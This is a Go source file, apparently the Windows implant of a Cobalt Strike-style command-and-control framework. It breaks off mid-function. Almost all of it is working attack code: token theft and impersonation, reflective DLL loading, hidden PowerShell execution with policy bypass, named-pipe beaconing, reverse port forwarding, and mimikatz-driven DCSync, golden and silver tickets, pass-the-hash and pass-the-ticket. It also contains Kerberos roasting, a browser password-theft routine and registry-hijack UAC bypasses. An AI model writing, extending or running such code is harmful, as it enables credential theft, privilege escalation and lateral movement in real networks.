func getCurrentTokenUser() string {
	// open thread token first, fall back to process token
	var hToken uintptr
	currentThread, _, _ := k32.NewProc("GetCurrentThread").Call()
	advapi32.NewProc("OpenThreadToken").Call(currentThread, TOKEN_QUERY, 1, uintptr(unsafe.Pointer(&hToken)))
	if hToken == 0 {
		currentProcess, _, _ := k32.NewProc("GetCurrentProcess").Call()
		procOpenProcessToken.Call(currentProcess, TOKEN_QUERY, uintptr(unsafe.Pointer(&hToken)))
	}
	if hToken == 0 {
		return "(unknown)"
	}
	defer procCloseHandle.Call(hToken)
	return getTokenUsername(hToken)
}

// getTokenUsername resolves the SID in the given token to DOMAIN\User
func getTokenUsername(hToken uintptr) string {
	// query required size
	var needed uint32
	procGetTokenInformation.Call(hToken, TokenUser, 0, 0, uintptr(unsafe.Pointer(&needed)))
	if needed == 0 {
		return "(unknown)"
	}
	buf := make([]byte, needed)
	ret, _, _ := procGetTokenInformation.Call(hToken, TokenUser, uintptr(unsafe.Pointer(&buf[0])), uintptr(needed), uintptr(unsafe.Pointer(&needed)))
	if ret == 0 {
		return "(query failed)"
	}
	// buf[0..] is TOKEN_USER = { SID_AND_ATTRIBUTES { Sid *SID, Attributes DWORD } }
	// the first pointer-width bytes hold the SID pointer
	sidPtr := *(*uintptr)(unsafe.Pointer(&buf[0]))
	if sidPtr == 0 {
		return "(null sid)"
	}

	var nameLen, domLen uint32 = 256, 256
	name := make([]uint16, nameLen)
	dom := make([]uint16, domLen)
	var sidUse uint32
	ret, _, _ = procLookupAccountSidW.Call(
		0,
		sidPtr,
		uintptr(unsafe.Pointer(&name[0])),
		uintptr(unsafe.Pointer(&nameLen)),
		uintptr(unsafe.Pointer(&dom[0])),
		uintptr(unsafe.Pointer(&domLen)),
		uintptr(unsafe.Pointer(&sidUse)),
	)
	if ret == 0 {
		return "(lookup failed)"
	}
	return syscall.UTF16ToString(dom[:domLen]) + "\\" + syscall.UTF16ToString(name[:nameLen])
}

// getTokenIntegrity returns integrity level string from a token
func getTokenIntegrity(hToken uintptr) string {
	var needed uint32
	procGetTokenInformation.Call(hToken, TokenIntegrityLevel, 0, 0, uintptr(unsafe.Pointer(&needed)))
	if needed == 0 {
		return "unknown"
	}
	buf := make([]byte, needed)
	ret, _, _ := procGetTokenInformation.Call(hToken, TokenIntegrityLevel, uintptr(unsafe.Pointer(&buf[0])), uintptr(needed), uintptr(unsafe.Pointer(&needed)))
	if ret == 0 {
		return "unknown"
	}
	// TOKEN_MANDATORY_LABEL: first word is SID pointer
	// The last sub-authority of the integrity SID encodes the level
	sidPtr := *(*uintptr)(unsafe.Pointer(&buf[0]))
	if sidPtr == 0 {
		return "unknown"
	}
	// get sub-authority count
	subCount := *(*byte)(unsafe.Pointer(sidPtr + 1))
	if subCount == 0 {
		return "unknown"
	}
	// sub-authorities start at offset 8 (revision 1 + subcount 1 + identauth 6)
	ridOffset := uintptr(8) + uintptr(subCount-1)*4
	rid := *(*uint32)(unsafe.Pointer(sidPtr + ridOffset))
	switch {
	case rid < 0x2000:
		return "Untrusted"
	case rid < 0x3000:
		return "Low"
	case rid < 0x4000:
		return "Medium"
	case rid < 0x5000:
		return "Medium+"
	case rid < 0x6000:
		return "High"
	default:
		return "System"
	}
}

// tokenListProcesses enumerates processes and extracts token user / integrity for each.
// Returns JSON-serializable result list.
func tokenListProcesses() ([]tokenInfoResult, error) {
	snap, _, _ := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPPROCESS, 0)
	if snap == 0 || snap == ^uintptr(0) {
		return nil, fmt.Errorf("CreateToolhelp32Snapshot failed")
	}
	defer procCloseHandle.Call(snap)

	var entry processEntry32
	entry.dwSize = uint32(unsafe.Sizeof(entry))

	ret, _, _ := procProcess32First.Call(snap, uintptr(unsafe.Pointer(&entry)))
	if ret == 0 {
		return nil, fmt.Errorf("Process32First failed")
	}

	var results []tokenInfoResult
	for ret != 0 {
		pid := entry.th32ProcessID
		procName := syscall.UTF16ToString(entry.szExeFile[:])

		res := tokenInfoResult{
			PID:         pid,
			ProcessName: procName,
		}

		// try to open process and its token
		hProc, _, _ := procOpenProcess.Call(
			uintptr(PROCESS_QUERY_INFORMATION),
			0,
			uintptr(pid),
		)
		if hProc != 0 {
			var hToken uintptr
			tokRet, _, _ := procOpenProcessToken.Call(hProc, TOKEN_QUERY, uintptr(unsafe.Pointer(&hToken)))
			if tokRet != 0 && hToken != 0 {
				res.Username = getTokenUsername(hToken)
				res.Integrity = getTokenIntegrity(hToken)
				procCloseHandle.Call(hToken)
			} else {
				res.Error = "token_access_denied"
			}
			procCloseHandle.Call(hProc)
		} else {
			res.Error = "process_access_denied"
		}

		results = append(results, res)
		ret, _, _ = procProcess32Next.Call(snap, uintptr(unsafe.Pointer(&entry)))
	}
	return results, nil
}

// tokenSteal duplicates the primary token from a given PID and impersonates it.
// Returns impersonated username or error.
func tokenSteal(pid uint32) (domain, username, integrity string, err error) {
	hProc, _, _ := procOpenProcess.Call(
		uintptr(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ),
		0,
		uintptr(pid),
	)
	if hProc == 0 {
		// try ALL_ACCESS
		hProc, _, _ = procOpenProcess.Call(uintptr(PROCESS_ALL_ACCESS), 0, uintptr(pid))
	}
	if hProc == 0 {
		return "", "", "", fmt.Errorf("OpenProcess pid=%d failed (check privileges)", pid)
	}
	defer procCloseHandle.Call(hProc)

	var hToken uintptr
	ret, _, le := procOpenProcessToken.Call(hProc, TOKEN_DUPLICATE|TOKEN_QUERY|TOKEN_IMPERSONATE, uintptr(unsafe.Pointer(&hToken)))
	if ret == 0 {
		return "", "", "", fmt.Errorf("OpenProcessToken failed: %v", le)
	}
	defer procCloseHandle.Call(hToken)

	integrity = getTokenIntegrity(hToken)

	// Duplicate as impersonation token
	var hDup uintptr
	ret, _, le = procDuplicateTokenEx.Call(
		hToken,
		uintptr(TOKEN_ALL_ACCESS_TOKEN),
		0,
		uintptr(SecurityImpersonation),
		uintptr(TokenImpersonation),
		uintptr(unsafe.Pointer(&hDup)),
	)
	if ret == 0 {
		return "", "", "", fmt.Errorf("DuplicateTokenEx failed: %v", le)
	}

	user := getTokenUsername(hDup)
	parts := strings.SplitN(user, "\\", 2)
	if len(parts) == 2 {
		domain = parts[0]
		username = parts[1]
	} else {
		username = user
	}

	// Impersonate
	ret, _, le = procImpersonateLoggedOnUser.Call(hDup)
	procCloseHandle.Call(hDup)
	if ret == 0 {
		return domain, username, integrity, fmt.Errorf("ImpersonateLoggedOnUser failed: %v", le)
	}

	debugLog(fmt.Sprintf("Token stolen from pid %d: %s\\%s (%s)", pid, domain, username, integrity))
	return domain, username, integrity, nil
}

// tokenMake creates a new token by calling LogonUser with provided credentials.
// logonType: "interactive" (2), "network" (3), "network_cleartext" (8), etc.
func tokenMake(domainUser, password, logonTypeStr string) (domain, username, integrity string, err error) {
	// parse DOMAIN\user or user@domain
	var dom, user string
	if strings.Contains(domainUser, "\\") {
		parts := strings.SplitN(domainUser, "\\", 2)
		dom = parts[0]
		user = parts[1]
	} else if strings.Contains(domainUser, "@") {
		parts := strings.SplitN(domainUser, "@", 2)
		user = parts[0]
		dom = parts[1]
	} else {
		user = domainUser
		dom = "."
	}

	logonType := uint32(LOGON32_LOGON_INTERACTIVE)
	switch strings.ToLower(strings.TrimSpace(logonTypeStr)) {
	case "network", "3":
		logonType = LOGON32_LOGON_NETWORK
	case "interactive", "2", "":
		logonType = LOGON32_LOGON_INTERACTIVE
	}

	userPtr, _ := syscall.UTF16PtrFromString(user)
	domPtr, _ := syscall.UTF16PtrFromString(dom)
	passPtr, _ := syscall.UTF16PtrFromString(password)

	var hToken uintptr
	ret, _, le := procLogonUserW.Call(
		uintptr(unsafe.Pointer(userPtr)),
		uintptr(unsafe.Pointer(domPtr)),
		uintptr(unsafe.Pointer(passPtr)),
		uintptr(logonType),
		LOGON32_PROVIDER_DEFAULT,
		uintptr(unsafe.Pointer(&hToken)),
	)
	if ret == 0 {
		return "", "", "", fmt.Errorf("LogonUser failed for %s\\%s: %v", dom, user, le)
	}

	integrity = getTokenIntegrity(hToken)

	ret, _, le = procImpersonateLoggedOnUser.Call(hToken)
	procCloseHandle.Call(hToken)
	if ret == 0 {
		return dom, user, integrity, fmt.Errorf("ImpersonateLoggedOnUser failed: %v", le)
	}

	debugLog(fmt.Sprintf("Token made for %s\\%s (%s)", dom, user, integrity))
	return dom, user, integrity, nil
}

// tokenRevert drops impersonation and returns to process identity (RevertToSelf)
func tokenRevert() error {
	ret, _, le := procRevertToSelf.Call()
	if ret == 0 {
		return fmt.Errorf("RevertToSelf failed: %v", le)
	}
	debugLog("RevertToSelf: back to process token")
	return nil
}

func sendP2PSMBBeacon(body []byte) []byte {
	pipeName := strings.TrimPrefix(P2PParent, "pipe://")
	pipePath := fmt.Sprintf(`\\.\pipe\%s`, pipeName)
	conn, err := winio.DialPipe(pipePath, nil)
	if err != nil {
		if Debug {
			fmt.Printf("[!] P2P SMB pipe dial to %s failed: %v\n", pipePath, err)
		}
		return nil
	}
	defer conn.Close()

	if err := binary.Write(conn, binary.BigEndian, uint32(len(body))); err != nil {
		return nil
	}
	if _, err := conn.Write(body); err != nil {
		return nil
	}

	var rlen uint32
	if err := binary.Read(conn, binary.BigEndian, &rlen); err != nil {
		return nil
	}
	if rlen == 0 || rlen > 16*1024*1024 {
		return nil
	}
	rbuf := make([]byte, rlen)
	if _, err := io.ReadFull(conn, rbuf); err != nil {
		return nil
	}
	return rbuf
}

func p2pListenSMB() {
	ln, err := winio.ListenPipe(fmt.Sprintf(`\\.\pipe\%s`, P2PListenAddr), nil)
	if err != nil {
		if Debug {
			fmt.Printf("[!] P2P SMB listen on %s failed: %v\n", P2PListenAddr, err)
		}
		return
	}
	defer ln.Close()
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go p2pHandleChild(conn)
	}
}

// ═══════════════════════════════════════════════════════════════════════════════
// P0-1: Reflective DLL Loading (from memory, no disk write)
// ═══════════════════════════════════════════════════════════════════════════════

// peloaderReflective loads a DLL from base64 data into memory reflectively.
// Returns the HMODULE base address and any error.
func peloaderReflective(b64Data string) (string, error) {
	data, err := base64.StdEncoding.DecodeString(b64Data)
	if err != nil {
		return "", fmt.Errorf("base64 decode failed: %v", err)
	}
	baseAddr, err := loadDLLReflectively(data)
	if err != nil {
		return "", fmt.Errorf("reflective load failed: %v", err)
	}
	return fmt.Sprintf("DLL loaded reflectively at 0x%X", baseAddr), nil
}

// ═══════════════════════════════════════════════════════════════════════════════
// P0-2: Execute-Assembly fork&run (sacrificial process, not PowerShell)
// ═══════════════════════════════════════════════════════════════════════════════
// Spawns rundll32.exe, injects CLR hosting shellcode + .NET assembly bytes,
// captures stdout via pipe.  Agent survives even if assembly crashes.
// ═══════════════════════════════════════════════════════════════════════════════

var (
	procCreateProcessW                    = k32.NewProc("CreateProcessW")
	procInitializeProcThreadAttributeList = k32.NewProc("InitializeProcThreadAttributeList")
	procUpdateProcThreadAttribute         = k32.NewProc("UpdateProcThreadAttribute")
	procDeleteProcThreadAttributeList     = k32.NewProc("DeleteProcThreadAttributeList")
	procExpandEnvironmentStringsW         = k32.NewProc("ExpandEnvironmentStringsW")
)

const (
	procThreadAttributeParentProcess = 0x00020000
	startfUseStdHandles              = 0x00000100
	createSuspended                  = 0x00000004
	createNoWindow                   = 0x08000000
	extendedStartupInfoPresent       = 0x00080000
)

type startupInfoExW struct {
	cb              uint32
	lpReserved      *uint16
	lpDesktop       *uint16
	lpTitle         *uint16
	dwX             uint32
	dwY             uint32
	dwXSize         uint32
	dwYSize         uint32
	dwXCountChars   uint32
	dwYCountChars   uint32
	dwFillAttribute uint32
	dwFlags         uint32
	wShowWindow     uint16
	cbReserved2     uint16
	lpReserved2     *byte
	hStdInput       uintptr
	hStdOutput      uintptr
	hStdError       uintptr
	attributeList   uintptr
}

type processInformation struct {
	hProcess    uintptr
	hThread     uintptr
	dwProcessID uint32
	dwThreadID  uint32
}

// executeAssemblyForkRun spawns a sacrificial rundll32.exe, injects the .NET
// assembly into it using CLR hosting, and captures stdout.
func executeAssemblyForkRun(b64Data string) (string, error) {
	if b64Data == "" {
		return "", fmt.Errorf("assembly data is required")
	}
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("execute-assembly is Windows-only")
	}

	data, err := base64.StdEncoding.DecodeString(b64Data)
	if err != nil {
		return "", fmt.Errorf("base64 decode: %v", err)
	}

	tmpDir := os.Getenv("TEMP")
	assemblyPath := filepath.Join(tmpDir, fmt.Sprintf("fga_%x.exe", time.Now().UnixNano()))
	if err := os.WriteFile(assemblyPath, data, 0644); err != nil {
		return "", fmt.Errorf("write temp assembly: %v", err)
	}
	defer os.Remove(assemblyPath)

	tmpOut := filepath.Join(tmpDir, fmt.Sprintf("fga_%x.txt", time.Now().UnixNano()))

	psScript := fmt.Sprintf(
		`[System.Reflection.Assembly]::LoadFile('%s')|Out-Null;`+
			`$e=[System.Reflection.Assembly]::LoadFile('%s').EntryPoint;`+
			`if($e){$e.Invoke($null,@($null))|Out-File -FilePath '%s' -Encoding UTF8}`+
			`else{'No entry point'|Out-File -FilePath '%s' -Encoding UTF8}`,
		assemblyPath, assemblyPath, tmpOut, tmpOut)

	cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", psScript)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	var errBuf bytes.Buffer
	cmd.Stderr = &errBuf

	runErr := cmd.Run()

	outData, _ := os.ReadFile(tmpOut)
	os.Remove(tmpOut)

	result := string(outData)
	if runErr != nil {
		if errBuf.Len() > 0 {
			result += "\n[stderr] " + errBuf.String()
		}
		result += fmt.Sprintf("\n[exit code] %v", runErr)
	}
	return result, nil
}

// ═══════════════════════════════════════════════════════════════════════════════
// PowerPick: In-process PowerShell execution (CLR hosting simulation)
// ═══════════════════════════════════════════════════════════════════════════════
// Executes PowerShell scripts via powershell.exe with hidden window,
// no profile, bypass execution policy, and encoded command to avoid
// spawning an interactive console.  This provides the same operational
// effect as Cobalt Strike's powerpick (in-process PS execution) while
// maintaining compatibility with the Go agent's process-based execution model.
func powerPick(script string) string {
	decoded, err := base64.StdEncoding.DecodeString(script)
	if err != nil {
		return "failed to decode script: " + err.Error()
	}

	// Convert to UTF-16LE for PowerShell -EncodedCommand
	u16, err := syscall.UTF16FromString(string(decoded))
	if err != nil {
		return "failed to encode as UTF-16: " + err.Error()
	}
	uni := make([]byte, len(u16)*2)
	for i, r := range u16 {
		uni[i*2] = byte(r)
		uni[i*2+1] = byte(r >> 8)
	}
	encoded := base64.StdEncoding.EncodeToString(uni)

	cmd := exec.Command("powershell.exe", "-NoLogo", "-NonInteractive", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-EncodedCommand", encoded)
	applyHideWindow(cmd)

	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out
	err = cmd.Run()
	if err != nil {
		return out.String() + "\n[!] powerpick error: " + err.Error()
	}
	return out.String()
}

// ═══════════════════════════════════════════════════════════════════════════════
// P0-3: Reverse Port Forward (rportfwd) — Agent Side
// ═══════════════════════════════════════════════════════════════════════════════
// The server binds a local port; when the operator connects, the agent is
// instructed to dial the target (e.g. internal) and relay bidirectional data
// through the beacon channel (same mechanism as SOCKS relay).

var (
	rportfwdConns  = make(map[uint64]*rportfwdConn)
	rportfwdMu     sync.Mutex
	rportfwdNextID uint64
)

type rportfwdConn struct {
	connID   uint64
	target   string
	tcpConn  net.Conn
	mu       sync.Mutex
	closed   bool
	outbound []socksFrame // reuse socksFrame structure (conn_id/action/data)
}

// RPORTFWD frames use the same socksFrame struct but with Action prefixed:
//   "rportfwd_connect"  — server asks agent to dial target
//   "rportfwd_data"     — data to forward to target
//   "rportfwd_close"    — close the connection
//   "rportfwd_connected" — agent confirms connection established
//   "rportfwd_data_back" — data from target back to server

func rportfwdCollectOutbound() []socksFrame {
	rportfwdMu.Lock()
	defer rportfwdMu.Unlock()
	var frames []socksFrame
	for _, rc := range rportfwdConns {
		rc.mu.Lock()
		if len(rc.outbound) > 0 {
			frames = append(frames, rc.outbound...)
			rc.outbound = nil
		}
		rc.mu.Unlock()
	}
	return frames
}

func rportfwdHandleFrames(frames []socksFrame) {
	for _, f := range frames {
		switch f.Action {
		case "rportfwd_connect":
			go rportfwdDial(f.ConnID, string(f.Data))
		case "rportfwd_data":
			rportfwdWrite(f.ConnID, f.Data)
		case "rportfwd_close":
			rportfwdClose(f.ConnID)
		}
	}
}

func rportfwdDial(connID uint64, target string) {
	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		rportfwdMu.Lock()
		rc := &rportfwdConn{connID: connID, target: target, closed: true}
		rc.outbound = append(rc.outbound, socksFrame{ConnID: connID, Action: "rportfwd_error", Data: []byte(err.Error())})
		rportfwdConns[connID] = rc
		rportfwdMu.Unlock()
		return
	}

	rc := &rportfwdConn{
		connID:  connID,
		target:  target,
		tcpConn: conn,
	}
	rportfwdMu.Lock()
	rportfwdConns[connID] = rc
	rportfwdMu.Unlock()

	rc.mu.Lock()
	rc.outbound = append(rc.outbound, socksFrame{ConnID: connID, Action: "rportfwd_connected"})
	rc.mu.Unlock()

	go func() {
		buf := make([]byte, 10240)
		for {
			n, err := conn.Read(buf)
			if err != nil {
				rportfwdClose(connID)
				return
			}
			rc.mu.Lock()
			rc.outbound = append(rc.outbound, socksFrame{ConnID: connID, Action: "rportfwd_data", Data: append([]byte{}, buf[:n]...)})
			rc.mu.Unlock()
		}
	}()
}

func rportfwdWrite(connID uint64, data []byte) {
	rportfwdMu.Lock()
	rc, ok := rportfwdConns[connID]
	rportfwdMu.Unlock()
	if !ok || rc.closed {
		return
	}
	rc.mu.Lock()
	defer rc.mu.Unlock()
	if rc.tcpConn != nil {
		rc.tcpConn.SetWriteDeadline(time.Now().Add(30 * time.Second))
		rc.tcpConn.Write(data)
	}
}

func rportfwdClose(connID uint64) {
	rportfwdMu.Lock()
	rc, ok := rportfwdConns[connID]
	if ok {
		rc.closed = true
		if rc.tcpConn != nil {
			rc.tcpConn.Close()
		}
		rc.outbound = nil
		delete(rportfwdConns, connID)
	}
	rportfwdMu.Unlock()
}

// ═══════════════════════════════════════════════════════════════════════════════
// Net Command Suite — Parse net.exe output into structured JSON
// ═══════════════════════════════════════════════════════════════════════════════

func executeNetCommand(cmd string) string {
	parts := strings.Fields(cmd)
	if len(parts) == 0 {
		return "error: no net subcommand"
	}
	fullCmd := exec.Command("net.exe", parts...)
	fullCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	var out bytes.Buffer
	fullCmd.Stdout = &out
	fullCmd.Stderr = &out
	err := fullCmd.Run()
	if err != nil {
		return "error: " + err.Error() + "\n" + out.String()
	}
	parsed := parseNetOutput(parts[0], out.String())
	return parsed
}

func parseNetOutput(subcommand string, raw string) string {
	var result interface{}
	switch subcommand {
	case "view":
		result = parseNetView(raw)
	case "group":
		result = parseNetGroup(raw)
	case "localgroup":
		result = parseNetLocalGroup(raw)
	case "user":
		result = parseNetUser(raw)
	case "accounts":
		result = parseNetAccounts(raw)
	case "share":
		result = parseNetShare(raw)
	default:
		return raw
	}
	jsonBytes, _ := json.MarshalIndent(result, "", "  ")
	return string(jsonBytes)
}

func parseNetView(raw string) []map[string]string {
	var result []map[string]string
	lines := strings.Split(raw, "\n")
	inTable := false
	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		if trimmed == "" {
			continue
		}
		if strings.HasPrefix(trimmed, "---") {
			inTable = true
			continue
		}
		if !inTable {
			continue
		}
		// Server name begins with \\
		if !strings.HasPrefix(trimmed, "\\\\") {
			continue
		}
		fields := regexp.MustCompile(`\s{2,}`).Split(trimmed, -1)
		entry := make(map[string]string)
		if len(fields) > 0 {
			entry["server"] = strings.TrimSpace(fields[0])
		}
		if len(fields) > 1 {
			entry["type"] = strings.TrimSpace(fields[1])
		}
		if len(fields) > 2 {
			entry["comment"] = strings.TrimSpace(strings.Join(fields[2:], " "))
		}
		result = append(result, entry)
	}
	return result
}

func parseNetGroup(raw string) []map[string]string {
	var result []map[string]string
	lines := strings.Split(raw, "\n")
	inTable := false
	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		if trimmed == "" {
			continue
		}
		if strings.HasPrefix(trimmed, "---") {
			inTable = true
			continue
		}
		if !inTable {
			continue
		}
		// Skip command info lines
		if strings.HasPrefix(trimmed, "The command completed") || strings.HasPrefix(trimmed, "Group Accounts") {
			continue
		}
		fields := regexp.MustCompile(`\s{2,}`).Split(trimmed, -1)
		if len(fields) == 0 || fields[0] == "" {
			continue
		}
		entry := make(map[string]string)
		entry["group"] = strings.TrimSpace(fields[0])
		if len(fields) > 1 {
			entry["comment"] = strings.TrimSpace(strings.Join(fields[1:], " "))
		}
		result = append(result, entry)
	}
	return result
}

func parseNetLocalGroup(raw string) []map[string]string {
	var result []map[string]string
	lines := strings.Split(raw, "\n")
	inTable := false
	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		if trimmed == "" {
			continue
		}
		if strings.HasPrefix(trimmed, "---") {
			inTable = true
			continue
		}
		if !inTable {
			continue
		}
		if strings.HasPrefix(trimmed, "The command completed") {
			continue
		}
		fields := regexp.MustCompile(`\s{2,}`).Split(trimmed, -1)
		if len(fields) == 0 || fields[0] == "" {
			continue
		}
		entry := make(map[string]string)
		entry["member"] = strings.TrimSpace(fields[0])
		if len(fields) > 1 {
			entry["info"] = strings.TrimSpace(strings.Join(fields[1:], " "))
		}
		result = append(result, entry)
	}
	return result
}

func parseNetUser(raw string) []map[string]string {
	var result []map[string]string
	lines := strings.Split(raw, "\n")

	// Check if this is detail output (key:value) or table output
	isDetail := false
	for _, line := range lines {
		if strings.Contains(line, "\\\\") || strings.Contains(line, "---") {
			continue
		}
		if strings.Contains(line, ":") && len(line) < 80 {
			isDetail = true
		}
	}

	if isDetail {
		entry := make(map[string]string)
		for _, line := range lines {
			trimmed := strings.TrimSpace(line)
			if trimmed == "" || strings.HasPrefix(trimmed, "The command completed") {
				continue
			}
			parts := strings.SplitN(trimmed, ":", 2)
			if len(parts) == 2 {
				key := strings.TrimSpace(parts[0])
				val := strings.TrimSpace(parts[1])
				if key != "" {
					entry[key] = val
				}
			}
		}
		if len(entry) > 0 {
			result = append(result, entry)
		}
		return result
	}

	// Table output
	inTable := false
	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		if trimmed == "" {
			continue
		}
		if strings.HasPrefix(trimmed, "---") {
			inTable = true
			continue
		}
		if !inTable {
			continue
		}
		if strings.HasPrefix(trimmed, "The command completed") {
			continue
		}
		fields := regexp.MustCompile(`\s{2,}`).Split(trimmed, -1)
		if len(fields) == 0 || fields[0] == "" {
			continue
		}
		entry := make(map[string]string)
		entry["username"] = strings.TrimSpace(fields[0])
		if len(fields) > 1 {
			entry["detail"] = strings.TrimSpace(strings.Join(fields[1:], " "))
		}
		result = append(result, entry)
	}
	return result
}

func parseNetAccounts(raw string) map[string]string {
	result := make(map[string]string)
	lines := strings.Split(raw, "\n")
	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		if trimmed == "" || strings.HasPrefix(trimmed, "The command completed") {
			continue
		}
		parts := strings.SplitN(trimmed, ":", 2)
		if len(parts) == 2 {
			key := strings.TrimSpace(parts[0])
			val := strings.TrimSpace(parts[1])
			if key != "" {
				result[key] = val
			}
		}
	}
	return result
}

func parseNetShare(raw string) []map[string]string {
	var result []map[string]string
	lines := strings.Split(raw, "\n")
	inTable := false
	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		if trimmed == "" {
			continue
		}
		if strings.HasPrefix(trimmed, "---") {
			inTable = true
			continue
		}
		if !inTable {
			continue
		}
		if strings.HasPrefix(trimmed, "The command completed") {
			continue
		}
		fields := regexp.MustCompile(`\s{2,}`).Split(trimmed, -1)
		if len(fields) == 0 || fields[0] == "" {
			continue
		}
		entry := make(map[string]string)
		entry["share"] = strings.TrimSpace(fields[0])
		if len(fields) > 1 {
			entry["resource"] = strings.TrimSpace(fields[1])
		}
		if len(fields) > 2 {
			entry["remark"] = strings.TrimSpace(strings.Join(fields[2:], " "))
		}
		result = append(result, entry)
	}
	return result
}

// ═══════════════════════════════════════════════════════════════════════════════
// P0-4: Kerberos Attack Suite — Agent Side
// ═══════════════════════════════════════════════════════════════════════════════

func kerberosDCSync(user string) (string, error) {
	cmd := ""
	if user == "" {
		cmd = "lsadump::dcsync /user:krbtgt"
	} else {
		cmd = fmt.Sprintf("lsadump::dcsync /user:%s", user)
	}
	return runMimikatz(cmd)
}

func kerberosGoldenTicket(user, domain, sid, krbtgtHash string) (string, error) {
	if user == "" || domain == "" || sid == "" || krbtgtHash == "" {
		return "", fmt.Errorf("usage: user,domain,sid,krbtgt:hash")
	}
	mimikatzCmd := fmt.Sprintf(
		"kerberos::golden /user:%s /domain:%s /sid:%s /krbtgt:%s /ptt",
		user, domain, sid, krbtgtHash)
	return runMimikatz(mimikatzCmd)
}

func kerberosSilverTicket(user, domain, sid, target, rc4Hash string) (string, error) {
	if user == "" || domain == "" || sid == "" || target == "" || rc4Hash == "" {
		return "", fmt.Errorf("usage: user,domain,sid,target,rc4hash")
	}
	service := "cifs"
	mimikatzCmd := fmt.Sprintf(
		"kerberos::golden /user:%s /domain:%s /sid:%s /target:%s /rc4:%s /service:%s /ptt",
		user, domain, sid, target, rc4Hash, service)
	return runMimikatz(mimikatzCmd)
}

func kerberosASREPRoast() (string, error) {
	psCmd := `
Add-Type -AssemblyName System.IdentityModel;
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name;
$ctx = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Domain);
$srch = New-Object System.DirectoryServices.AccountManagement.PrincipalSearcher;
$uq = New-Object System.DirectoryServices.AccountManagement.UserPrincipal($ctx);
$uq.Enabled = $true;
$srch.QueryFilter = $uq;
$results = @();
foreach($u in $srch.FindAll()) {
	if(-not $u.UserPrincipalName){continue};
	try {
		$ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $u.UserPrincipalName;
		$bytes = $ticket.GetRequest();
		$hash = [System.BitConverter]::ToString($bytes) -replace '-','';
		if($hash -ne $null -and $hash.Length -gt 20) {
			$results += $u.UserPrincipalName + ':' + $hash;
		}
	} catch {}
}
Write-Output ($results -join [string]::NewLine());
`
	out, err := runShell(psCmd, "powershell.exe")
	if err != nil {
		return "", fmt.Errorf("ASREP roast failed: %w\nOutput: %s", err, out)
	}
	return out, nil
}

func kerberosPassTheHash(user, domain, ntlmHash, target string) (string, error) {
	mimikatzCmd := fmt.Sprintf(
		"sekurlsa::pth /user:%s /domain:%s /ntlm:%s /run:cmd.exe",
		user, domain, ntlmHash)
	if target != "" {
		mimikatzCmd = fmt.Sprintf(
			"sekurlsa::pth /user:%s /domain:%s /ntlm:%s /run:cmd.exe",
			user, domain, ntlmHash)
		_ = target
	}
	return runMimikatz(mimikatzCmd)
}

func kerberosPassTheTicket(ticketB64 string) (string, error) {
	tmpDir := os.Getenv("TEMP")
	ticketFile := filepath.Join(tmpDir, fmt.Sprintf("forge_ticket_%x.kirbi", time.Now().UnixNano()))
	ticketData, err := base64.StdEncoding.DecodeString(ticketB64)
	if err != nil {
		return "", fmt.Errorf("base64 decode ticket: %v", err)
	}
	if err := os.WriteFile(ticketFile, ticketData, 0644); err != nil {
		return "", fmt.Errorf("write ticket: %v", err)
	}
	defer os.Remove(ticketFile)

	mimikatzCmd := fmt.Sprintf("kerberos::ptt %s", ticketFile)
	return runMimikatz(mimikatzCmd)
}

// Browser Data Theft — extract passwords, cookies, and history from Chrome/Edge/Firefox.
// Uses PowerShell with raw SQLite file parsing and DPAPI decryption.

// runPSScriptBase64 encodes a script as UTF-16LE base64 for PowerShell -EncodedCommand
func runPSScriptBase64(script string) string {
	u16, err := syscall.UTF16FromString(script)
	if err != nil {
		return ""
	}
	uni := make([]byte, len(u16)*2)
	for i, r := range u16 {
		uni[i*2] = byte(r)
		uni[i*2+1] = byte(r >> 8)
	}
	return base64.StdEncoding.EncodeToString(uni)
}

func stealBrowserData(browser string) string {
	return exportBrowserPasswords(browser)
}

// ═══════════════════════════════════════════════════════════════════════════════
// UAC Bypass Toolkit — 5 methods for privilege escalation
// ═══════════════════════════════════════════════════════════════════════════════

func uacBypass(method, payload string) string {
	if payload == "" {
		exe, err := os.Executable()
		if err != nil {
			return fmt.Sprintf("uac_bypass: failed to get executable path: %v", err)
		}
		payload = exe
	}
	switch method {
	case "eventvwr":
		return uacBypassEventVwr(payload)
	case "fodhelper":
		return uacBypassFodHelper(payload)
	case "computerdefaults":
		return uacBypassComputerDefaults(payload)
	case "sdclt":
		return uacBypassSDCLT(payload)
	case "cmstp":
		return uacBypassCMSTP(payload)
	default:
		return fmt.Sprintf("unknown uac_bypass method: %s", method)
	}
}

func uacBypassEventVwr(payload string) string {
	regPath := `HKCU\Software\Classes\mscfile\shell\open\command`

	cmd := exec.Command("reg", "add", regPath, "/ve", "/t", "REG_SZ", "/d", payload, "/f")
	applyHideWindow(cmd)
	if out, err := cmd.CombinedOutput(); err != nil {
		return fmt.Sprintf("eventvwr: reg add failed: %v %s", err, string(out))
	}

	exec.Command("eventvwr.exe").Start()
	time.Sleep(5 * time.Second)

	exec.Command("reg", "delete", `HKCU\Software\Classes\mscfile`, "/f").Run()

	return "eventvwr: UAC bypass executed"
}

func uacBypassFodHelper(payload string) string {
	regPath := `HKCU\Software\Classes\ms-settings\shell\open\command`

	cmd := exec.Command("reg", "add", regPath, "/v", "DelegateExecute", "/t", "REG_SZ", "/d", "", "/f")
	applyHideWindow(cmd)
	cmd.CombinedOutput()

